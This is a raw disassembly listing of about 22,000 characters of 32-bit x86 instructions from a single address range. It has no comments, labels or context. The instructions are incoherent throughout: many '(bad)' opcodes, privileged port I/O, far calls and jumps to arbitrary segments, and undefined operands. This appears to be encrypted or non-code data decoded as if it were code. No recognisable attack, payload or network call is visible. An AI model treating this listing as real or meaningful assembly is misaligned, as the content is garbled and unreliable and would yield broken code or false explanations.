  41ce9e:	addr16 pop esi
  41cea0:	mov    DWORD PTR [edi-0x46],ebx
  41cea3:	es stos DWORD PTR es:[edi],eax
  41cea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cea6:	or     edx,DWORD PTR [ebp+0x566ea925]
  41ceac:	pusha  
  41cead:	jp     0x41ce89
  41ceaf:	fisttp WORD PTR [edi+0x59]
  41ceb2:	inc    ebx
  41ceb3:	add    BYTE PTR [ebp-0x5f5c4be],bh
  41ceb9:	sbb    al,0x5f
  41cebb:	mov    ds:0xa2363264,al
  41cec0:	jae    0x41ce8e
  41cec2:	stc    
  41cec3:	pop    ds
  41cec4:	stos   BYTE PTR es:[edi],al
  41cec5:	dec    esi
  41cec6:	or     esp,ebp
  41cec8:	and    edx,DWORD PTR ds:0x13ad8cc1
  41cece:	mov    ds:0x93615de4,al
  41ced3:	pushf  
  41ced4:	ds push ecx
  41ced6:	mov    al,ds:0x12f8ff17
  41cedb:	es hlt 
  41cedd:	(bad)  
  41cede:	cdq    
  41cedf:	shl    BYTE PTR [edx],1
  41cee1:	pop    edx
  41cee2:	ss jg  0x41ce85
  41cee5:	aaa    
  41cee6:	(bad)  
  41cee7:	leave  
  41cee8:	jge    0x41cf31
  41ceea:	jp     0x41ce6d
  41ceec:	outs   dx,BYTE PTR ds:[esi]
  41ceed:	adc    edx,DWORD PTR [ecx-0x14]
  41cef0:	ins    DWORD PTR es:[edi],dx
  41cef1:	lock xchg esp,esi
  41cef4:	xchg   edx,eax
  41cef5:	cld    
  41cef6:	jnp    0x41cecc
  41cef8:	imul   ebp,DWORD PTR [esi+0x663edc9a],0xfab8dd61
  41cf02:	pop    esi
  41cf03:	(bad)  
  41cf05:	xchg   esp,eax
  41cf06:	sub    esp,DWORD PTR [eax]
  41cf08:	jmp    0x41cea1
  41cf0a:	cmp    DWORD PTR [esi+0x13],0x1453a999
  41cf11:	jae    0x41ceee
  41cf13:	xor    esi,ebx
  41cf15:	stc    
  41cf16:	jl     0x41cefb
  41cf18:	sbb    ebx,DWORD PTR [edx]
  41cf1a:	stos   BYTE PTR es:[edi],al
  41cf1b:	in     eax,dx
  41cf1c:	cmp    esi,DWORD PTR gs:[edx+0x3d]
  41cf20:	bound  edx,QWORD PTR [esi-0xc013321]
  41cf26:	arpl   WORD PTR [esi+0x637c179d],ax
  41cf2c:	mul    DWORD PTR [ebx+0x5e980e17]
  41cf32:	cdq    
  41cf33:	sub    bh,BYTE PTR [eax+0x32]
  41cf36:	(bad)  
  41cf38:	(bad)  
  41cf39:	arpl   WORD PTR [esi+0x56],si
  41cf3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf3d:	cmc    
  41cf3e:	sar    BYTE PTR [edx+edi*2-0x757be38c],1
  41cf45:	inc    esi
  41cf46:	and    bh,BYTE PTR [ebx+0x437fe345]
  41cf4c:	lods   eax,DWORD PTR ds:[esi]
  41cf4d:	mov    edx,0x7ea1933c
  41cf52:	sub    edi,DWORD PTR [eax-0x68]
  41cf55:	sbb    esp,DWORD PTR ss:[ebp-0x46]
  41cf59:	sub    BYTE PTR [edi-0x43],dl
  41cf5c:	ror    ecx,0x4a
  41cf5f:	and    al,0x2e
  41cf61:	add    ebp,esi
  41cf63:	das    
  41cf64:	(bad)  
  41cf65:	and    bl,ch
  41cf67:	shl    bl,0x24
  41cf6a:	js     0x41cf65
  41cf6c:	pop    ss
  41cf6d:	inc    esi
  41cf6e:	ds dec esp
  41cf70:	jb     0x41cfb0
  41cf72:	call   0x1de1:0x6236b051
  41cf79:	cwde   
  41cf7a:	daa    
  41cf7b:	xor    eax,0xb5b83ec8
  41cf80:	pop    ss
  41cf81:	not    BYTE PTR [ecx-0x63]
  41cf84:	cmp    BYTE PTR [eax+0x68],bh
  41cf87:	and    bh,bh
  41cf89:	fwait
  41cf8a:	gs clc 
  41cf8c:	add    BYTE PTR [edi-0x23],dh
  41cf8f:	push   0xffffffa5
  41cf91:	leave  
  41cf92:	dec    edi
  41cf93:	jns    0x41cf8a
  41cf95:	dec    esi
  41cf96:	jbe    0x41cf44
  41cf98:	mov    ?,WORD PTR [ecx+0x55a1b807]
  41cf9e:	outs   dx,DWORD PTR ds:[esi]
  41cf9f:	and    al,0x59
  41cfa1:	repz shl BYTE PTR [ebx-0xc940236],0xbf
  41cfa9:	add    eax,0xb7022a8e
  41cfae:	pop    esp
  41cfaf:	mov    edx,0xef35e641
  41cfb4:	addr16 fadd st(6),st
  41cfb7:	fidivr WORD PTR [esi]
  41cfb9:	push   0x234aaa0d
  41cfbe:	cld    
  41cfbf:	cmc    
  41cfc0:	xor    esp,DWORD PTR [esi+eiz*8-0x76]
  41cfc4:	retf   0xf4d7
  41cfc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfc8:	outs   dx,BYTE PTR ds:[esi]
  41cfc9:	mov    ds,WORD PTR [ebx]
  41cfcb:	into   
  41cfcc:	or     dh,BYTE PTR [eax+0x74]
  41cfcf:	ins    BYTE PTR es:[edi],dx
  41cfd0:	in     al,0x49
  41cfd2:	fsub   QWORD PTR [edi-0x65a44ed8]
  41cfd8:	(bad)  
  41cfd9:	rcl    DWORD PTR [ebx-0x91f0105],1
  41cfdf:	push   0xffffffcd
  41cfe1:	or     ch,0x6a
  41cfe4:	xchg   ecx,eax
  41cfe5:	xchg   BYTE PTR [ebx-0x6c],bh
  41cfe8:	rol    DWORD PTR [edx-0x506a23f],0x4b
  41cfef:	pop    esi
  41cff0:	imul   esp,DWORD PTR [ebx-0x28a4b308],0xfb2c3c2f
  41cffa:	push   0xffffffc2
  41cffc:	lods   al,BYTE PTR ds:[esi]
  41cffd:	mov    ds:0x48c49fed,al
  41d002:	mov    al,ds:0xc474af35
  41d007:	mov    BYTE PTR [ebx],ah
  41d009:	call   0x17d6505e
  41d00e:	or     ebp,ebp
  41d010:	fwait
  41d011:	pop    edx
  41d012:	div    dl
  41d014:	and    al,0x3d
  41d016:	jmp    0xa8d6:0xedea5b96
  41d01d:	jae    0x41cfdc
  41d01f:	mov    ch,0xca
  41d021:	mov    dh,0x22
  41d023:	xor    eax,DWORD PTR [ecx+0x749f6a2a]
  41d029:	adc    BYTE PTR [edi+0x5e],ch
  41d02c:	outs   dx,DWORD PTR ds:[esi]
  41d02d:	cdq    
  41d02e:	push   eax
  41d02f:	mov    bl,0xce
  41d031:	push   ss
  41d032:	dec    esi
  41d033:	call   0x752cddd
  41d038:	mov    ecx,0xb491dc3c
  41d03d:	mov    esi,DWORD PTR [edx]
  41d03f:	sbb    ah,BYTE PTR [edi+0x3969953c]
  41d045:	pop    ds
  41d046:	retf   0x6694
  41d049:	push   0xffffffbe
  41d04b:	adc    al,bl
  41d04d:	in     eax,dx
  41d04e:	test   BYTE PTR [ebx+0x28],ch
  41d051:	jo     0x41d088
  41d053:	xchg   edx,eax
  41d054:	inc    ebx
  41d055:	aaa    
  41d056:	jp     0x41d025
  41d058:	(bad)  
  41d059:	mov    ch,0x2a
  41d05b:	test   eax,0x352d9bf2
  41d060:	nop
  41d061:	mov    BYTE PTR [ebx+ebp*1],bl
  41d064:	lods   eax,DWORD PTR ds:[esi]
  41d065:	pop    es
  41d066:	xor    cl,0x34
  41d069:	push   edi
  41d06a:	push   0xffffffd1
  41d06c:	stc    
  41d06d:	rcl    ah,0x32
  41d070:	add    eax,0x4ea6b51b
  41d075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d076:	sahf   
  41d077:	inc    eax
  41d078:	cwde   
  41d079:	inc    esp
  41d07a:	jns    0x41d05b
  41d07c:	outs   dx,DWORD PTR ds:[esi]
  41d07d:	mov    eax,esp
  41d07f:	cld    
  41d080:	mov    edi,0xc399a43f
  41d085:	shl    DWORD PTR [eax-0x1c],1
  41d088:	inc    ebx
  41d089:	into   
  41d08a:	jle    0x41d0d5
  41d08c:	mul    BYTE PTR [ebx+0x79]
  41d08f:	cmp    eax,DWORD PTR [edx+0x78bbc35a]
  41d095:	mov    ebp,0x9555c139
  41d09a:	push   edx
  41d09b:	or     BYTE PTR [esi-0x43],dl
  41d09e:	fidiv  WORD PTR [eax+0x6c]
  41d0a1:	fwait
  41d0a2:	jg     0x41d041
  41d0a4:	ins    DWORD PTR es:[edi],dx
  41d0a5:	xchg   ebx,eax
  41d0a6:	shrd   DWORD PTR [eax-0x63948beb],esp,0x3
  41d0ae:	pushf  
  41d0af:	pop    ss
  41d0b0:	ja     0x41d0ed
  41d0b2:	sahf   
  41d0b3:	in     al,0x20
  41d0b5:	xchg   esp,eax
  41d0b6:	sub    edx,eax
  41d0b8:	jae    0x41d0d7
  41d0ba:	jbe    0x41d040
  41d0bc:	sub    BYTE PTR [ecx+0x221cf511],ch
  41d0c2:	mov    eax,0x84697999
  41d0c7:	cmp    DWORD PTR [esi*8+0x22551fcf],0x9b417a1f
  41d0d2:	out    0x7a,al
  41d0d4:	push   edi
  41d0d5:	inc    esi
  41d0d6:	clc    
  41d0d7:	push   esp
  41d0d8:	stc    
  41d0d9:	mov    bh,0xcd
  41d0db:	(bad)  
  41d0dc:	stc    
  41d0dd:	xchg   esp,eax
  41d0de:	aas    
  41d0df:	cmp    al,0x2e
  41d0e1:	pushf  
  41d0e2:	xchg   ecx,eax
  41d0e3:	sub    BYTE PTR [edi],al
  41d0e5:	mov    edx,0x1316f764
  41d0ea:	fld    QWORD PTR [ebx-0x1aa1938f]
  41d0f0:	repz push 0xffffffed
  41d0f3:	enter  0x86e9,0xd8
  41d0f7:	mov    ch,0x71
  41d0f9:	out    0x57,al
  41d0fb:	push   0xfab230ac
  41d100:	mov    dl,0x8f
  41d102:	repnz mov al,0x3c
  41d105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d106:	aad    0x1b
  41d108:	sahf   
  41d109:	adc    eax,0xf177f7c6
  41d10e:	inc    ecx
  41d10f:	sub    edi,DWORD PTR [ecx-0x7d]
  41d112:	sbb    BYTE PTR ds:[esi+0x7e],cl
  41d116:	inc    esi
  41d117:	cmp    BYTE PTR [ecx],ch
  41d119:	mov    eax,ds:0x62029426
  41d11e:	pop    ebp
  41d11f:	mov    al,ds:0xd0f110be
  41d124:	and    dl,0xeb
  41d127:	mov    DWORD PTR [edi],eax
  41d129:	adc    DWORD PTR [esi-0x3a],0x8d7d7841
  41d130:	adc    bl,BYTE PTR [eax]
  41d132:	cmp    edx,DWORD PTR [edi+0x67]
  41d135:	xchg   ecx,eax
  41d136:	sbb    BYTE PTR [ebx+0x4e06f8ad],cl
  41d13c:	xchg   bl,ah
  41d13e:	mov    ebx,0xdaf74c4d
  41d143:	test   eax,0x2465e697
  41d148:	(bad)  
  41d14a:	add    DWORD PTR [edx+0x11034b79],esp
  41d150:	aam    0xb8
  41d152:	aam    0x4b
  41d154:	arpl   WORD PTR [eax-0x3d],bp
  41d157:	inc    edx
  41d158:	ja     0x41d1a5
  41d15a:	mov    WORD PTR [edx+ebx*1-0x5c],?
  41d15e:	lea    edx,[eax+0x6f377dd3]
  41d164:	or     al,0x1f
  41d166:	mov    ebp,0xb0db54c8
  41d16b:	xchg   edx,eax
  41d16c:	and    ecx,DWORD PTR [eax-0x3a93818]
  41d172:	cld    
  41d173:	lea    esp,[eax+0x65bfe92f]
  41d179:	cdq    
  41d17a:	in     eax,0xe4
  41d17c:	inc    ebx
  41d17d:	inc    esi
  41d17e:	jl     0x41d185
  41d180:	cdq    
  41d181:	add    DWORD PTR [edi-0x4b],edx
  41d184:	aam    0x7a
  41d186:	in     al,dx
  41d187:	addr16 aad 0xf3
  41d18a:	shl    edi,1
  41d18c:	push   edi
  41d18d:	js     0x41d13c
  41d18f:	mov    ecx,fs
  41d191:	in     eax,dx
  41d192:	sub    al,0x83
  41d194:	mov    edx,0x8210edde
  41d199:	or     esi,DWORD PTR [eax+0x31]
  41d19c:	nop
  41d19d:	fwait
  41d19e:	enter  0x7039,0xfc
  41d1a2:	ins    BYTE PTR es:[edi],dx
  41d1a3:	addr16 jb 0x41d132
  41d1a6:	add    al,0x2e
  41d1a8:	jl     0x41d145
  41d1aa:	jmp    0x41d20e
  41d1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1ad:	fwait
  41d1ae:	pushf  
  41d1af:	or     edx,DWORD PTR [esi-0x4af1ce97]
  41d1b5:	xor    DWORD PTR [ebx],ecx
  41d1b7:	ins    BYTE PTR es:[edi],dx
  41d1b8:	xchg   edi,eax
  41d1b9:	dec    edx
  41d1ba:	cmpxchg BYTE PTR [esi-0x439a96b3],cl
  41d1c1:	jnp    0x41d225
  41d1c3:	xor    bl,ah
  41d1c5:	imul   ebx,ebx,0x5a
  41d1c8:	ret    
  41d1c9:	ror    DWORD PTR [esi+0x432ee472],1
  41d1cf:	addr16 push esi
  41d1d1:	dec    edi
  41d1d2:	popa   
  41d1d3:	not    DWORD PTR [esi+0x64]
  41d1d6:	lock xor DWORD PTR [ebx-0x3b],esp
  41d1da:	ja     0x41d258
  41d1dc:	push   edi
  41d1dd:	sbb    esp,ebx
  41d1df:	xchg   edx,eax
  41d1e0:	(bad)
  41d1e5:	mov    edx,0xb22824cd
  41d1ea:	pop    esi
  41d1eb:	jne    0x41d24b
  41d1ed:	cmp    al,0xef
  41d1ef:	mov    edi,0xd3cb370f
  41d1f4:	bound  esi,QWORD PTR [edi*8-0x2bcc8273]
  41d1fb:	out    dx,eax
  41d1fc:	pop    eax
  41d1fd:	not    BYTE PTR [ecx]
  41d1ff:	add    dh,ch
  41d201:	push   es
  41d202:	sar    DWORD PTR [ebp+0x667971a5],1
  41d208:	cmp    BYTE PTR [edi-0x2d],bh
  41d20b:	test   dh,al
  41d20d:	inc    edx
  41d20e:	test   DWORD PTR [edi],edi
  41d210:	add    bh,BYTE PTR [edi+0xb5606bf]
  41d216:	xlat   BYTE PTR ds:[ebx]
  41d217:	jbe    0x41d1eb
  41d219:	mov    esp,0x1efe8679
  41d21e:	(bad)  
  41d220:	shl    BYTE PTR [ebx+0x247cb6fc],1
  41d226:	dec    ebx
  41d227:	and    ah,ah
  41d229:	xchg   BYTE PTR [edi+0x1a],cl
  41d22c:	daa    
  41d22d:	les    eax,FWORD PTR [eax+ebp*2]
  41d230:	sub    eax,0x290858f3
  41d235:	mov    ebp,0x20494ee7
  41d23a:	mov    WORD PTR [edx-0x5d],gs
  41d23d:	int3   
  41d23e:	call   0xe38e:0x46140ba
  41d245:	(bad)  
  41d246:	sbb    bl,bh
  41d248:	sar    DWORD PTR [edi-0x410623ff],cl
  41d24e:	fcomp  st(5)
  41d250:	(bad)  
  41d252:	fistp  QWORD PTR [esi-0x59a923fb]
  41d258:	fwait
  41d259:	retf   0x4dee
  41d25c:	push   ebp
  41d25d:	(bad)  
  41d25e:	ss xchg edi,eax
  41d260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d261:	pop    esp
  41d262:	mov    eax,ds:0x7d27490d
  41d267:	dec    edi
  41d268:	out    0xcf,eax
  41d26a:	arpl   sp,si
  41d26c:	mov    ebx,DWORD PTR [ebx+0x11fc42e6]
  41d272:	mov    esp,0xfbc824c8
  41d277:	add    ecx,DWORD PTR [edx+0x9]
  41d27a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d27b:	fs jns 0x41d267
  41d27e:	(bad)  
  41d27f:	imul   edi,DWORD PTR [esi-0x1b7b56],0xffffffea
  41d286:	adc    DWORD PTR [edi-0x1],ebx
  41d289:	xchg   bh,ch
  41d28b:	dec    esi
  41d28c:	repnz cmp al,0x36
  41d28f:	or     al,0x22
  41d291:	sbb    al,0xe9
  41d293:	sbb    eax,0xf847ee1
  41d298:	add    eax,ebp
  41d29a:	sub    bh,ch
  41d29c:	mov    ah,0x35
  41d29e:	pop    ebx
  41d29f:	mul    DWORD PTR fs:[edi]
  41d2a2:	fbstp  TBYTE PTR [esp+ebx*1-0x22ad32ad]
  41d2a9:	sbb    eax,0x33f69
  41d2ae:	cmp    eax,0x36209364
  41d2b3:	std    
  41d2b4:	inc    esp
  41d2b5:	cmp    dl,ch
  41d2b7:	push   cs
  41d2b8:	pop    es
  41d2b9:	in     al,dx
  41d2ba:	(bad)
  41d2be:	jg     0x41d2a1
  41d2c0:	out    0x9d,eax
  41d2c2:	stos   DWORD PTR es:[edi],eax
  41d2c3:	mov    cs,ebp
  41d2c5:	sub    esi,DWORD PTR [edx-0x5f]
  41d2c8:	cmp    DWORD PTR [edx+0x6407b9b6],0x89303989
  41d2d2:	shr    eax,1
  41d2d4:	and    al,BYTE PTR [ecx+0x469a3e87]
  41d2da:	pop    ebx
  41d2db:	dec    ecx
  41d2dc:	repnz sbb al,0x9c
  41d2df:	in     eax,0x12
  41d2e1:	ss leave 
  41d2e3:	xor    al,BYTE PTR [eax]
  41d2e5:	hlt    
  41d2e6:	push   ecx
  41d2e7:	rcr    BYTE PTR ds:0x37750159,1
  41d2ed:	not    DWORD PTR [ebx-0x3e7d08a]
  41d2f3:	xchg   esp,eax
  41d2f4:	xor    BYTE PTR [edi-0x5e32d68e],dh
  41d2fa:	test   DWORD PTR [edi-0x37],esp
  41d2fd:	imul   ecx,DWORD PTR [ecx+0x17],0x7d
  41d301:	inc    edi
  41d302:	and    DWORD PTR [esi],edx
  41d304:	push   ebp
  41d305:	inc    esp
  41d306:	aad    0xbd
  41d308:	out    0x6b,al
  41d30a:	in     al,dx
  41d30b:	out    0xa2,eax
  41d30d:	sub    ecx,edx
  41d30f:	push   ss
  41d310:	enter  0x9a8f,0xba
  41d314:	idiv   BYTE PTR [esi+0x45]
  41d317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d318:	cmp    bh,BYTE PTR ds:0x46952ced
  41d31e:	dec    esp
  41d31f:	(bad)  
  41d320:	fdivr  QWORD PTR [ebx+eiz*8-0x224cc4f3]
  41d327:	adc    DWORD PTR [edx+0x6a],edi
  41d32a:	dec    esp
  41d32b:	aas    
  41d32c:	cmp    edx,DWORD PTR [esi-0x74a63d61]
  41d332:	push   cs
  41d333:	and    eax,0x8880bfdb
  41d338:	push   ebx
  41d339:	and    esp,DWORD PTR [edx]
  41d33b:	lds    edi,FWORD PTR [edx]
  41d33d:	push   0xd3bd114a
  41d342:	jle    0x41d36e
  41d344:	popf   
  41d345:	jne    0x41d368
  41d347:	or     edx,ebx
  41d349:	xor    al,0xef
  41d34b:	lahf   
  41d34c:	inc    ebp
  41d34d:	outs   dx,DWORD PTR ds:[esi]
  41d34e:	and    al,0xed
  41d350:	and    dl,BYTE PTR [ebp+0x37]
  41d353:	mov    dh,0xfe
  41d355:	mov    edx,esi
  41d357:	push   0x5a
  41d359:	mov    ebx,0xd6359aa4
  41d35e:	ins    BYTE PTR es:[edi],dx
  41d35f:	jnp    0x41d37e
  41d361:	inc    eax
  41d362:	sbb    eax,0xa09b5250
  41d367:	push   cs
  41d368:	pushf  
  41d369:	scas   eax,DWORD PTR es:[edi]
  41d36a:	popa   
  41d36b:	cmp    edx,DWORD PTR [edi]
  41d36d:	add    al,0xa1
  41d36f:	scas   eax,DWORD PTR es:[edi]
  41d370:	mov    ebp,0x2b42dad8
  41d375:	shr    ebp,0x29
  41d378:	pop    eax
  41d379:	pop    ds
  41d37a:	mov    eax,DWORD PTR fs:[eax-0x72]
  41d37e:	and    DWORD PTR [esi-0x19],esp
  41d381:	sub    DWORD PTR [eax],ebx
  41d383:	sbb    eax,0x6da271cf
  41d388:	pushf  
  41d389:	and    DWORD PTR [ecx-0x7d],esi
  41d38c:	stos   DWORD PTR es:[edi],eax
  41d38d:	jo     0x41d336
  41d38f:	imul   esp,DWORD PTR [eax+0x5c],0xfffffffa
  41d393:	adc    ebx,DWORD PTR ds:[edi-0x7]
  41d397:	bound  ecx,QWORD PTR [edi]
  41d399:	std    
  41d39a:	or     bh,al
  41d39c:	jmp    0x39b:0xd77c22af
  41d3a3:	(bad)  
  41d3a4:	jb     0x41d361
  41d3a6:	scas   eax,DWORD PTR es:[edi]
  41d3a7:	add    ecx,DWORD PTR [eax+0x24ba4bb9]
  41d3ad:	adc    ah,ah
  41d3af:	pop    ebp
  41d3b0:	les    esp,FWORD PTR [ecx-0x45]
  41d3b3:	test   eax,0x9e404e55
  41d3b8:	retf   0xdf82
  41d3bb:	sbb    eax,0x6a83322e
  41d3c0:	hlt    
  41d3c1:	jmp    0x9163f41f
  41d3c6:	sbb    al,BYTE PTR [eax]
  41d3c8:	xchg   eax,eax
  41d3ca:	aaa    
  41d3cb:	je     0x41d448
  41d3cd:	repnz int 0xd4
  41d3d0:	add    DWORD PTR [ecx+ebx*4+0x20972b22],0xfffffff6
  41d3d8:	inc    edx
  41d3d9:	and    BYTE PTR [esi],dh
  41d3db:	stos   BYTE PTR es:[edi],al
  41d3dc:	ret    0x7a75
  41d3df:	lock sbb ecx,DWORD PTR ds:0x348bbea0
  41d3e6:	das    
  41d3e7:	dec    ebx
  41d3e8:	int    0x6e
  41d3ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3eb:	stos   DWORD PTR es:[edi],eax
  41d3ec:	dec    ebp
  41d3ed:	clc    
  41d3ee:	mov    ds:0x33f4afcf,eax
  41d3f3:	lds    edx,FWORD PTR [ebp-0x2f]
  41d3f6:	pop    esp
  41d3f7:	xchg   ebp,eax
  41d3f8:	jge    0x41d40f
  41d3fa:	idiv   ch
  41d3fc:	stc    
  41d3fd:	daa    
  41d3fe:	sbb    eax,0x7ae0c15d
  41d403:	xchg   ebx,eax
  41d404:	cmp    ch,0x46
  41d407:	pop    ecx
  41d408:	pop    ss
  41d409:	jecxz  0x41d44c
  41d40b:	jmp    0x41d447
  41d40d:	cli    
  41d40e:	dec    edi
  41d40f:	and    DWORD PTR ds:0x26393490,esp
  41d415:	jno    0x41d3b0
  41d417:	and    DWORD PTR es:[ecx+0x7cc955b7],esp
  41d41e:	mov    edi,0x5e73042
  41d423:	cmp    al,0x85
  41d425:	int3   
  41d426:	pop    ebp
  41d427:	mov    ds:0xe40f269d,al
  41d42c:	outs   dx,BYTE PTR ds:[esi]
  41d42d:	mov    ch,0x4a
  41d42f:	sub    ecx,DWORD PTR [eax]
  41d431:	dec    ebp
  41d432:	inc    edx
  41d433:	in     al,0x57
  41d435:	in     eax,dx
  41d436:	sti    
  41d437:	sub    ah,ch
  41d439:	and    al,ch
  41d43b:	ja     0x41d482
  41d43d:	push   ss
  41d43e:	pop    edx
  41d43f:	cld    
  41d440:	sbb    eax,0xd478b9d4
  41d445:	mov    ebp,0x3d3fff3c
  41d44a:	ss inc eax
  41d44c:	sbb    BYTE PTR [esp+eax*2-0x63],ah
  41d450:	mov    ch,0xc1
  41d452:	push   cs
  41d453:	push   ebx
  41d454:	int3   
  41d455:	inc    esp
  41d456:	sbb    DWORD PTR [edi+0x9],ebx
  41d459:	pop    ecx
  41d45a:	fisubr DWORD PTR [eax+0x50]
  41d45d:	jo     0x41d4da
  41d45f:	jno    0x41d458
  41d461:	rcl    BYTE PTR [edx-0x6a7951a8],cl
  41d467:	or     BYTE PTR [esi+0x6c],bl
  41d46a:	psrlq  mm1,QWORD PTR [eax-0x6d123a67]
  41d471:	push   esp
  41d472:	sbb    eax,0x2ebf9307
  41d477:	cmp    cl,ch
  41d479:	ss cli 
  41d47b:	aaa    
  41d47c:	lods   al,BYTE PTR ds:[esi]
  41d47d:	out    0x36,al
  41d47f:	adc    al,0x76
  41d481:	mov    ebx,0xca9091b0
  41d486:	rcr    DWORD PTR [esi-0x8bcb89a],cl
  41d48c:	sub    al,0xb6
  41d48e:	push   edx
  41d48f:	popa   
  41d490:	sbb    bl,BYTE PTR [ebp-0x197b7c67]
  41d496:	fld    QWORD PTR [ecx+0x2c]
  41d499:	js     0x41d4ec
  41d49b:	and    ecx,DWORD PTR [ecx-0x4b]
  41d49e:	retf   
  41d49f:	test   BYTE PTR ds:0x648d9fa3,dh
  41d4a5:	xchg   ebx,eax
  41d4a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4a7:	mov    bl,BYTE PTR [ecx-0x71]
  41d4aa:	jae    0x41d521
  41d4ac:	(bad)  
  41d4ad:	mov    ebx,0x5f177a58
  41d4b2:	or     bl,dh
  41d4b4:	ins    BYTE PTR es:[edi],dx
  41d4b5:	push   cs
  41d4b6:	pushf  
  41d4b7:	and    DWORD PTR [esp+ecx*2+0x7ce0bc07],edx
  41d4be:	inc    edx
  41d4bf:	mov    edx,DWORD PTR ds:0x1b4226db
  41d4c5:	iret   
  41d4c6:	out    0x63,al
  41d4c8:	mov    WORD PTR [edi],?
  41d4ca:	nop
  41d4cb:	xchg   ecx,eax
  41d4cc:	shl    BYTE PTR [ebx+0x5371d4aa],1
  41d4d2:	call   0xd1e5:0xc6d5c7ef
  41d4d9:	add    DWORD PTR [edi+0x65],ecx
  41d4dc:	inc    edi
  41d4dd:	fnstenv [edi+edi*2+0x6e83410c]
  41d4e4:	sub    al,0x86
  41d4e6:	push   0x5253cc0
  41d4eb:	add    BYTE PTR [eax+ecx*4],al
  41d4ee:	loopne 0x41d4cb
  41d4f0:	and    cl,bl
  41d4f2:	ja     0x41d560
  41d4f4:	jbe    0x41d51c
  41d4f6:	jmp    0x67c7ef1e
  41d4fb:	inc    ecx
  41d4fc:	xor    DWORD PTR [eax],0x5f
  41d4ff:	dec    esp
  41d500:	cld    
  41d501:	bound  esp,QWORD PTR [ebx-0x44b2b708]
  41d507:	mov    bl,0x85
  41d509:	jae    0x41d576
  41d50b:	dec    esi
  41d50c:	jge    0x41d58d
  41d50e:	out    0xad,al
  41d510:	fidiv  WORD PTR [eax]
  41d512:	sti    
  41d513:	sbb    BYTE PTR [edx+0x57],dl
  41d516:	arpl   WORD PTR [edi+0x7f],dx
  41d519:	cmp    dh,BYTE PTR [ebp-0x5f]
  41d51c:	out    dx,al
  41d51d:	mov    eax,ds:0x62c4a47c
  41d522:	outs   dx,BYTE PTR ds:[esi]
  41d523:	dec    ecx
  41d524:	test   al,0x23
  41d526:	leave  
  41d527:	adc    bl,dl
  41d529:	push   cs
  41d52a:	sbb    eax,0x6d440fe8
  41d52f:	aaa    
  41d530:	(bad)  
  41d531:	stos   BYTE PTR es:[edi],al
  41d532:	or     al,0x51
  41d534:	bound  esi,QWORD PTR [ebp-0x22]
  41d537:	cs push es
  41d539:	or     DWORD PTR [ecx-0x7a],ecx
  41d53c:	imul   ebx,DWORD PTR [esi+ecx*4-0x4ba9abf9],0x5c
  41d544:	outs   dx,BYTE PTR ds:[esi]
  41d545:	jp     0x41d4f7
  41d547:	push   cs
  41d548:	(bad)  
  41d54a:	mov    al,0x41
  41d54c:	sbb    eax,0x35e7c466
  41d551:	add    eax,0x1aa2c51b
  41d556:	retf   0xbf21
  41d559:	xchg   edx,eax
  41d55a:	adc    al,0xae
  41d55c:	push   0xe2f02303
  41d561:	jmp    0x41d557
  41d563:	jns    0x41d587
  41d565:	jbe    0x41d506
  41d567:	stc    
  41d568:	xchg   bh,al
  41d56a:	jg     0x41d544
  41d56c:	mov    edx,0xcd3f8263
  41d571:	cwde   
  41d572:	cdq    
  41d573:	jo     0x41d571
  41d575:	sub    DWORD PTR fs:[ebp-0x73],ecx
  41d579:	or     DWORD PTR [edi-0x783615cc],edx
  41d57f:	clc    
  41d580:	jg     0x41d52e
  41d582:	add    DWORD PTR [edi+0x18],ebx
  41d585:	xchg   bl,ah
  41d587:	imul   ebp,DWORD PTR [esi],0x98f726a6
  41d58d:	aaa    
  41d58e:	mov    bl,0xbd
  41d590:	mov    ah,0x3e
  41d592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d593:	inc    ebx
  41d594:	pop    ecx
  41d595:	xor    edi,0xa6f758f0
  41d59b:	add    ch,BYTE PTR [esi]
  41d59d:	xchg   edx,eax
  41d59e:	jl     0x41d60f
  41d5a0:	in     eax,0x1e
  41d5a2:	into   
  41d5a3:	adc    al,0x5c
  41d5a5:	jno    0x41d61c
  41d5a7:	in     al,dx
  41d5a8:	inc    esp
  41d5a9:	push   cs
  41d5aa:	in     al,0x9e
  41d5ac:	sbb    DWORD PTR [esi],eax
  41d5ae:	and    ch,BYTE PTR [esi+eiz*8]
  41d5b1:	cmp    al,0xf4
  41d5b3:	cmp    BYTE PTR [eax-0x19],0xcc
  41d5b7:	out    0x14,eax
  41d5b9:	inc    ebx
  41d5ba:	xchg   ecx,eax
  41d5bb:	xchg   edx,eax
  41d5bc:	xor    ebx,DWORD PTR [edi-0x54]
  41d5bf:	sbb    DWORD PTR ss:[ecx+0x460f3207],ebp
  41d5c6:	or     bl,BYTE PTR [eax]
  41d5c8:	sbb    DWORD PTR [edi-0x195fea9f],esp
  41d5ce:	ret    0xd76e
  41d5d1:	mov    bl,0x1c
  41d5d3:	dec    ebp
  41d5d4:	pop    ebx
  41d5d5:	sbb    bl,dh
  41d5d7:	in     eax,0x6d
  41d5d9:	xchg   esp,eax
  41d5da:	sbb    ch,bl
  41d5dc:	aad    0x67
  41d5de:	fcomp  QWORD PTR [ebx+0x4645f18]
  41d5e4:	cmc    
  41d5e5:	or     al,BYTE PTR [ecx]
  41d5e7:	sub    eax,DWORD PTR [eax]
  41d5e9:	in     eax,dx
  41d5ea:	call   0x16f8:0x7bc678ec
  41d5f1:	fisttp QWORD PTR [ebx+ecx*8]
  41d5f4:	je     0x41d615
  41d5f6:	int    0x5a
  41d5f8:	pop    ds
  41d5f9:	dec    esi
  41d5fa:	out    0x50,al
  41d5fc:	push   DWORD PTR [ecx+0x1e82cec2]
  41d602:	xchg   DWORD PTR [edx+0x34],ecx
  41d605:	mov    edi,0x3d05ddc9
  41d60a:	in     eax,0x7d
  41d60c:	lods   al,BYTE PTR ds:[esi]
